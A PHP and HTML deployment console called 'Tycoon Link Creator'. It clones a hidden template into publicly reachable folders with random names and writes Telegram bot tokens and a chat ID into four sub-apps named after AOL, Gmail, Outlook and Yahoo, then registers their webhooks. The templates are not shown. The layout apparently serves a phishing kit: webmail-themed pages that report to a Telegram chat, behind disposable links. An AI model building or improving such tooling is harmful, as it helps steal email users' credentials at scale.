<?php
declare(strict_types=1);

/*
 * Telegram deployment console
 * Place this file beside a private App/ template directory on your cPanel host.
 * App/ is never published. New, public copies are created in deployments/.
 */
session_start();

// cPanel installations can run PHP 7 while the app template may include a PHP 8 polyfill.
if (!function_exists('str_contains')) {
    function str_contains($haystack, $needle) { return $needle !== '' && strpos($haystack, $needle) !== false; }
}

const TEMPLATE_DIR = __DIR__ . '/App';
const DEPLOYMENTS_DIR = __DIR__ . '/deployments';
const MANIFEST_DIR = __DIR__ . '/data/manifests';
const BOT_FOLDERS = ['aol', 'gmail', 'outlook', 'yahoo'];

function h(string $value): string { return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
function jsonResponse(array $data): never { header('Content-Type: application/json; charset=utf-8'); echo json_encode($data); exit; }
function csrf(): string { return $_SESSION['csrf'] ??= bin2hex(random_bytes(32)); }
function verifyCsrf(): void { if (!hash_equals($_SESSION['csrf'] ?? '', (string)($_POST['csrf'] ?? ''))) jsonResponse(['ok' => false, 'message' => 'Your session expired. Refresh the page and try again.']); }
function baseUrl(): string {
    $configured = getenv('DEPLOYER_BASE_URL');
    if (is_string($configured) && $configured !== '') return rtrim($configured, '/');
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
    $host = preg_replace('/[^A-Za-z0-9.:-]/', '', $_SERVER['HTTP_HOST'] ?? 'localhost');
    $path = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/')), '/');
    return ($https ? 'https' : 'http') . '://' . $host . ($path === '/' ? '' : $path);
}
function copyTree(string $source, string $target): void {
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($iterator as $item) {
        $relative = substr($item->getPathname(), strlen($source) + 1);
        if (substr($relative, 0, 5) === '.git/' || $relative === '.git') continue;
        $destination = $target . '/' . $relative;
        if ($item->isDir()) { if (!is_dir($destination) && !mkdir($destination, 0755, true) && !is_dir($destination)) throw new RuntimeException('Cannot create deployment directory.'); }
        else if (!copy($item->getPathname(), $destination)) throw new RuntimeException('Cannot copy ' . $relative); else @chmod($destination, 0644);
    }
}
function slug(): string {
    $adjectives = ['amber', 'atlas', 'bright', 'cobalt', 'lumen', 'nova', 'orbit', 'prime', 'swift', 'velvet'];
    $nouns = ['bridge', 'canvas', 'harbor', 'junction', 'launch', 'portal', 'studio', 'summit', 'vertex', 'wave'];
    return $adjectives[array_rand($adjectives)] . '-' . $nouns[array_rand($nouns)] . '-' . bin2hex(random_bytes(3));
}
function replaceDefineValue(string $contents, string $constant, string $value, int &$count): string {
    $name = preg_quote($constant, '/');
    $pattern = '/^(\\s*define\\s*\\(\\s*[\'\"]' . $name . '[\'\"]\\s*,\\s*)[\'\"][^\'\"]*[\'\"](\\s*\\)\\s*;.*)$/m';
    $updated = preg_replace_callback($pattern, function ($match) use ($value) {
        return $match[1] . "'" . $value . "'" . $match[2];
    }, $contents, 1, $count);
    return is_string($updated) ? $updated : $contents;
}
function updateConfig(string $path, string $token, string $chatId, string $appUrl): void {
    if (!is_file($path)) throw new RuntimeException('Missing expected config file: ' . basename(dirname($path)) . '/config.php');
    $contents = file_get_contents($path);
    if ($contents === false) throw new RuntimeException('Cannot read ' . $path);
    $tokenCount = $chatCount = $urlCount = 0;
    $updated = replaceDefineValue($contents, 'TG_TOKEN', $token, $tokenCount);
    $updated = replaceDefineValue($updated, 'TG_CHAT_ID', $chatId, $chatCount);
    $updated = replaceDefineValue($updated, 'APP_URL', $appUrl, $urlCount);
    if ($tokenCount !== 1 || $chatCount !== 1 || $urlCount !== 1) throw new RuntimeException(basename(dirname($path)) . '/config.php must define TG_TOKEN, TG_CHAT_ID, and APP_URL exactly once.');
    if (file_put_contents($path, $updated, LOCK_EX) === false) throw new RuntimeException('Cannot write ' . $path);
    @chmod($path, 0640);
}
function readManifest(string $slug): array {
    if (!preg_match('/^[a-z]+-[a-z]+-[a-f0-9]{6}$/', $slug)) throw new RuntimeException('Invalid deployment.');
    $file = MANIFEST_DIR . '/' . $slug . '.json';
    $data = is_file($file) ? json_decode((string)file_get_contents($file), true) : null;
    if (!is_array($data)) throw new RuntimeException('Deployment manifest not found.');
    return $data;
}
function callWebhookSetup(string $url): array {
    if (!function_exists('curl_init')) return ['ok' => false, 'message' => 'PHP cURL is not enabled on this server.'];
    $separator = str_contains($url, '?') ? '&' : '?';
    $ch = curl_init($url . $separator . 'format=json');
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 20, CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_FOLLOWLOCATION => false, CURLOPT_USERAGENT => 'Telegram-Deployment-Console/1.0']);
    $body = curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_RESPONSE_CODE); $error = curl_error($ch); curl_close($ch);
    $payload = is_string($body) ? json_decode($body, true) : null;
    if ($code >= 200 && $code < 300) return ['ok' => true, 'message' => 'Webhook setup successful (HTTP ' . $code . ').'];
    return ['ok' => false, 'message' => $error ?: ('Setup endpoint did not return a successful JSON confirmation (HTTP ' . $code . ').')];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verifyCsrf();
    try {
        $action = (string)($_POST['action'] ?? '');
        if ($action === 'create') {
            if (!is_dir(TEMPLATE_DIR)) throw new RuntimeException('Create an App directory beside index.php and put your four bot folders inside it first.');
            $tokens = $_POST['token'] ?? []; $chatId = trim((string)($_POST['chat_id'] ?? ''));
            if (!is_array($tokens) || count($tokens) !== 4 || $chatId === '') throw new RuntimeException('Enter all four bot tokens and the chat ID.');
            foreach ($tokens as $token) if (!is_string($token) || !preg_match('/^\\d{5,12}:[A-Za-z0-9_-]{20,200}$/', trim($token))) throw new RuntimeException('One or more bot tokens is invalid.');
            if (!preg_match('/^-?\\d{1,20}$/', $chatId)) throw new RuntimeException('Enter a numeric Telegram chat ID (for example, -1001234567890).');
            foreach ([DEPLOYMENTS_DIR, MANIFEST_DIR] as $dir) if (!is_dir($dir) && !mkdir($dir, 0755, true) && !is_dir($dir)) throw new RuntimeException('Cannot create application storage.');
            do { $id = slug(); $destination = DEPLOYMENTS_DIR . '/' . $id; } while (file_exists($destination));
            if (!mkdir($destination, 0755, true)) throw new RuntimeException('Cannot create the new deployment.');
            try {
                copyTree(TEMPLATE_DIR, $destination);
                $url = baseUrl() . '/deployments/' . rawurlencode($id) . '/';
                foreach (BOT_FOLDERS as $i => $folder) updateConfig($destination . '/' . $folder . '/config.php', trim($tokens[$i]), $chatId, $url . rawurlencode($folder));
                $endpoints = array_map(function ($folder) use ($url) { return $url . rawurlencode($folder) . '/setup-webhook.php'; }, BOT_FOLDERS);
                $manifest = ['id' => $id, 'url' => $url, 'created_at' => gmdate('c'), 'webhook_endpoints' => array_combine(BOT_FOLDERS, $endpoints)];
                file_put_contents(MANIFEST_DIR . '/' . $id . '.json', json_encode($manifest, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
                jsonResponse(['ok' => true, 'deployment' => $manifest]);
            } catch (Throwable $e) { throw $e; }
        }
        if ($action === 'setup') {
            $manifest = readManifest((string)($_POST['deployment'] ?? ''));
            $results = [];
            foreach ($manifest['webhook_endpoints'] as $folder => $endpoint) {
                $results[$folder] = $folder === 'DDDD'
                    ? ['ok' => true, 'not_required' => true, 'message' => 'No webhook required for DDDD.']
                    : callWebhookSetup($endpoint);
            }
            jsonResponse(['ok' => true, 'results' => $results]);
        }
        throw new RuntimeException('Unknown request.');
    } catch (Throwable $e) { http_response_code(422); jsonResponse(['ok' => false, 'message' => $e->getMessage()]); }
}
?><!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Launch Console</title>
<style>
*{box-sizing:border-box}body{margin:0;min-height:100vh;background:#070a12;color:#edf1ff;font:15px/1.45 Inter,ui-sans-serif,system-ui,-apple-system,sans-serif;background-image:radial-gradient(circle at 15% 10%,#29326a66,transparent 28rem),radial-gradient(circle at 88% 85%,#0b685b55,transparent 26rem)}.shell{max-width:920px;margin:auto;padding:64px 24px}.eyebrow{color:#8fa9ff;font-weight:700;letter-spacing:.12em;font-size:11px;text-transform:uppercase}.card{margin-top:24px;background:#111727d9;border:1px solid #ffffff18;border-radius:24px;padding:34px;box-shadow:0 24px 80px #0006}h1{font-size:clamp(32px,5vw,55px);line-height:1.04;letter-spacing:-.045em;margin:12px 0}p{color:#aeb8d2;max-width:660px}.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:28px}.field{background:#0a0f1b;border:1px solid #ffffff1c;border-radius:14px;padding:14px}.field:last-child{grid-column:span 2}label{display:block;font-size:12px;color:#aab5d5;font-weight:700;margin-bottom:7px}input{width:100%;border:0;outline:0;background:transparent;color:#fff;font:inherit}button{border:0;border-radius:12px;background:linear-gradient(135deg,#7790ff,#7a62e8);color:white;font-weight:800;padding:14px 19px;cursor:pointer;margin-top:18px;font-size:15px;box-shadow:0 10px 30px #5e69d044}button:disabled{opacity:.55;cursor:wait}.note{font-size:12px;color:#7f8aa8;margin:16px 0 0}.result{display:none;margin-top:24px;border-radius:16px;padding:18px;background:#0a201d;border:1px solid #35cf9c55}.url{word-break:break-all;font-family:ui-monospace,SFMono-Regular,monospace;color:#b9ffe3}.copy{background:#183f35;margin:12px 8px 0 0}.status{margin-top:16px;display:grid;gap:8px}.row{padding:11px 13px;border-radius:10px;background:#ffffff09}.good{color:#8dffd1}.bad{color:#ff9ca6}@media(max-width:560px){.shell{padding:32px 16px}.card{padding:24px}.grid{grid-template-columns:1fr}.field:last-child{grid-column:auto}}
</style></head><body><main class="shell"><div class="eyebrow">Private deployment manager</div><h1>Tycoon <br>Link Creator.</h1><p>Injects the matching token and shared chat ID, and gives you a unique production URL.</p><section class="card"><form id="launch"><input type="hidden" name="csrf" value="<?= h(csrf()) ?>"><input type="hidden" name="action" value="create"><div class="grid"><?php foreach (BOT_FOLDERS as $folder): ?><div class="field"><label><?= h($folder) ?> TELEGRAM TOKEN</label><input required name="token[]" type="password" autocomplete="off" placeholder="123456:AA…"></div><?php endforeach; ?><div class="field"><label>TELEGRAM CHAT ID</label><input required name="chat_id" autocomplete="off" placeholder="-1001234567890"></div></div><button id="launchButton">Create secure launch link</button></form><div id="result" class="result"><strong class="good">Deployment ready</strong><div id="link" class="url"></div><button class="copy" id="copy">Copy launch link</button><button id="webhooks">Set up all webhooks</button><div id="statuses" class="status"></div></div><div class="note">Tokens are used only for this request and written into the generated app configuration; they are not saved by this console.</div></section></main><script>
const form=document.querySelector('#launch'), result=document.querySelector('#result'), link=document.querySelector('#link'), statuses=document.querySelector('#statuses');let current;
async function request(data){const r=await fetch(location.href,{method:'POST',body:data});const j=await r.json();if(!j.ok)throw new Error(j.message||'Request failed');return j}
form.addEventListener('submit',async e=>{e.preventDefault();const b=document.querySelector('#launchButton');b.disabled=true;b.textContent='Creating…';try{const j=await request(new FormData(form));current=j.deployment;link.textContent=current.url;result.style.display='block';statuses.innerHTML='';form.reset()}catch(err){alert(err.message)}finally{b.disabled=false;b.textContent='Create secure launch link'}});
document.querySelector('#copy').onclick=async()=>{try{await navigator.clipboard.writeText(current.url);document.querySelector('#copy').textContent='Copied ✓'}catch{prompt('Copy this link:',current.url)}};
document.querySelector('#webhooks').onclick=async()=>{const b=document.querySelector('#webhooks');b.disabled=true;b.textContent='Checking Telegram…';const d=new FormData();d.append('csrf',document.querySelector('[name=csrf]').value);d.append('action','setup');d.append('deployment',current.id);try{const j=await request(d);statuses.innerHTML=Object.entries(j.results).map(([name,r])=>`<div class="row ${r.ok?'good':'bad'}"><b>${name}</b> — ${r.ok?(r.not_required?'No webhook required':'Successful'):'Needs attention'}<br><small>${r.message}</small></div>`).join('')}catch(err){alert(err.message)}finally{b.disabled=false;b.textContent='Set up all webhooks'}};
</script></body></html>
